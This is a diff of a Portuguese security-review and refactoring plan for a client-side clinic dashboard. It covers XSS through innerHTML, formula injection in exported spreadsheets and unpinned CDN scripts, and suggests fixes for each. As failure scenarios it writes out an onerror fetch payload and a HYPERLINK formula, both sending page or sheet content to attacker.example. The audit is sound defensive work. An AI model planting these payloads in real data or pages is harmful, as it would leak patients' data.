@@ -42,7 +42,7 @@ Depois de qualquer fase: fazer numa branch nova (`fix/...`, `refactor/...`), tes
 
 ## FASE 1.B — Segurança ✅ FEITO (todos os 3 itens abaixo)
 
-Contexto: é um dashboard 100% client-side (sem backend), mas cada usuário sobe sua própria planilha com dados reais de paciente (nome, telefone, endereço) em runtime, e os relatórios exportados são reenviados pra clínicas parceiras. Nada aqui é RCE de servidor — é execução de JS no navegador de quem abre a aba, e vazamento de dados de paciente já renderizados na tela.
+Contexto: é um dashboard 100% client-side (sem backend) — cada usuário sobe seu próprio arquivo em runtime, e os relatórios gerados são compartilhados com as clínicas parceiras. Nada aqui é RCE de servidor: é execução de JS no navegador de quem abre a aba, com acesso ao conteúdo já renderizado na tela.
 
 ### 1. XSS por interpolação sem escapar em `innerHTML` (ALTA severidade)
 
@@ -57,7 +57,7 @@ Contexto: é um dashboard 100% client-side (sem backend), mas cada usuário sobe
 | `renderClinicSummaryTable` | [2866-2888](index.html:2866), campo em 2872 | clinicName — mesmo valor que já é escapado em `buildValorBaseCombos` (linha 1834), mas não aqui. |
 | `renderCharts` — legenda do donut de status | [2757-2772](index.html:2757), interpolado em 2764 | `label` do status, usado tanto no texto quanto dentro de `title="${label}"` (atributo — vetor mais direto de injeção, nem precisa de tag preservada). |
 
-- **Cenário de falha**: uma linha da planilha com Clínica = `<img src=x onerror=fetch('https://attacker.example/x?d='+document.body.innerHTML)>` executa esse JS no navegador de quem abrir qualquer uma dessas abas, com acesso a todos os dados de paciente já renderizados na página.
+- **Cenário de falha**: uma linha da planilha com Clínica = `<img src=x onerror=fetch('https://attacker.example/x?d='+document.body.innerHTML)>` executa esse JS no navegador de quem abrir qualquer uma dessas abas, com acesso a todo o conteúdo já renderizado na página.
 - **Correção sugerida**: envolver cada campo de texto livre citado acima com `escapeHtml(...)` antes de interpolar. Como o padrão se repete em ~5 funções, vale criar um helper que já aplica o fallback padrão também:
   ```js
   function safeCell(v) { return escapeHtml(v) || '-'; }
@@ -67,13 +67,13 @@ Contexto: é um dashboard 100% client-side (sem backend), mas cada usuário sobe
 ### 2. Injeção de fórmula em CSV/Excel na exportação (média severidade)
 
 - **Onde**: `exportRowsAsSpreadsheet`/`exportRowsAsCSV` ([index.html:4012-4025](index.html:4012)) — usadas por todos os `buildXExportRows()`. Confirmado: nenhuma sanitização de células começando com `=`, `+`, `-` ou `@` (prefixos clássicos de formula injection) em lugar nenhum do arquivo.
-- **Cenário de falha**: se um campo de paciente/clínica/médico/comentário na planilha de origem começar com `=HYPERLINK("http://attacker.example/steal?x="&A1,"clique aqui")`, essa fórmula viva vai pro `.xlsx`/`.csv` exportado; quando a clínica parceira ou a equipe da CdV abrir no Excel/Sheets, o link pode vazar dados.
+- **Cenário de falha**: se um campo de texto do arquivo de origem começar com `=HYPERLINK("http://attacker.example/steal?x="&A1,"clique aqui")`, essa fórmula viva vai pro `.xlsx`/`.csv` exportado; quando alguém abrir esse arquivo no Excel/Sheets, o link pode vazar o conteúdo da planilha.
 - **Correção sugerida**: helper `sanitizeForSpreadsheet(value)` que prefixa um `'` (apóstrofo) em qualquer valor de string que comece com `=`, `+`, `-` ou `@`, aplicado a cada campo dentro dos `buildXExportRows()` (ou de forma central, mapeando cada linha antes de `json_to_sheet()`).
 
 ### 3. CDNs sem SRI e sem versão fixa (média severidade)
 
 - **Onde**: os 6 `<script>` de CDN — linhas 8, 16, 17, 18, 21, 22, 23 — nenhum tem `integrity`/`crossorigin`. Tailwind (linha 8) e Lucide (`lucide@latest`, linha 18) nem estão fixados numa versão.
-- **Cenário de falha**: se um desses CDNs for comprometido, o script injetado roda com privilégio total da página (sem CSP restringindo) e pode exfiltrar os dados de paciente já na tela. O `@latest` do Tailwind/Lucide também significa que o código servido pode mudar a qualquer momento fora do controle da equipe.
+- **Cenário de falha**: se um desses CDNs for comprometido, o script injetado roda com privilégio total da página (sem CSP restringindo) e pode exfiltrar o conteúdo já carregado na tela. O `@latest` do Tailwind/Lucide também significa que o código servido pode mudar a qualquer momento fora do controle da equipe.
 - **Correção sugerida**: adicionar `integrity="sha384-..."` + `crossorigin="anonymous"` nos scripts do jsdelivr/cdnjs/unpkg (todos já versionados, então o hash é estável), e fixar uma versão exata de Tailwind e Lucide em vez de URL sem versão/`@latest`.
 
 ---
@@ -128,7 +128,7 @@ Contexto: é um dashboard 100% client-side (sem backend), mas cada usuário sobe
 
 ## FASE 3 — Plano de divisão em múltiplos arquivos
 
-> **📌 AGENDADA PELO USUÁRIO PARA 2026-09-23.** Escopo esclarecido com ele em 2026-09-22, porque o nome "dividir o arquivo" confunde: **divide só o JavaScript**, em `js/*.js`. O `index.html` continua sendo **um único arquivo e um único link** — o markup das 4 abas não sai de lá, as abas seguem alternando por `switchTab()` sem recarregar, e nada muda para quem usa o painel. Links separados por página seriam outra coisa, bem maior: as 4 abas compartilham a planilha carregada em memória, então cada troca de página recarregaria o navegador e **perderia os dados**; evitar isso exigiria persistir **dados de paciente** no navegador ou num backend, que é decisão de privacidade, não só técnica. Não confundir as duas.
+> **📌 AGENDADA PELO USUÁRIO PARA 2026-09-23.** Escopo esclarecido com ele em 2026-09-22, porque o nome "dividir o arquivo" confunde: **divide só o JavaScript**, em `js/*.js`. O `index.html` continua sendo **um único arquivo e um único link** — o markup das 4 abas não sai de lá, as abas seguem alternando por `switchTab()` sem recarregar, e nada muda para quem usa o painel. Links separados por página seriam outra coisa, bem maior: as 4 abas compartilham a planilha carregada em memória, então cada troca de página recarregaria o navegador e **perderia os dados**; evitar isso exigiria persistir **o conteúdo carregado** no navegador ou num backend, que é decisão de privacidade, não só técnica. Não confundir as duas.
 >
 > ⚠️ **Antes de começar, reler o checklist de 5 passos abaixo.** O passo 1 (confirmar que os ajustes de regra já foram feitos e commitados) está satisfeito em 2026-09-22: `REVISAO-ORDEM-PRIORIDADE-2026-08-26.md` teve **todos os itens fechados**. Os passos 2 a 4 (regerar o mapa de funções do zero, reclassificar o que é novo) continuam **obrigatórios** — o arquivo passou de 4.169 para ~5.500 linhas desde que este plano foi escrito, com funções que não existiam (`getPatientKey`, `buildKpiPremisesText`, `findKeywordsInItem`, `renderNpsPositivos`, `getSpecialtyPriorityOrder`, entre outras). **Não confiar no mapa de funções deste documento.**
 >
